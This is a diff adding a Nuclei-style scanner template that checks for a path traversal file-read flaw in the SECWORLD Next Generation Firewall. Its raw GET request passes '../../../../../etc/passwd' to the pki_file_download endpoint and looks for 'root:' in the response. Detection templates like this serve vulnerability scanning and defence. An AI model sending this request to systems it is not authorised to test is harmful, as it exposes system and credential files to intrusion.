@@ -1,0 +1,31 @@
+id: secworld-firewall-file-read
+
+info:
+  name: SECWORLD Next Generation Firewall File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Vulnerability in SECWORLD Next Generation Firewall allows attackers to read files via the `pki_file_download` endpoint.
+  reference:
+    - http://wiki.peiqi.tech
+  tags: file-read
+
+variables:
+  filepath: "../../../../../etc/passwd"
+
+http:
+  - raw:
+      - |
+        GET /?g=pki_file_download&filename={{filepath}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+        part: body
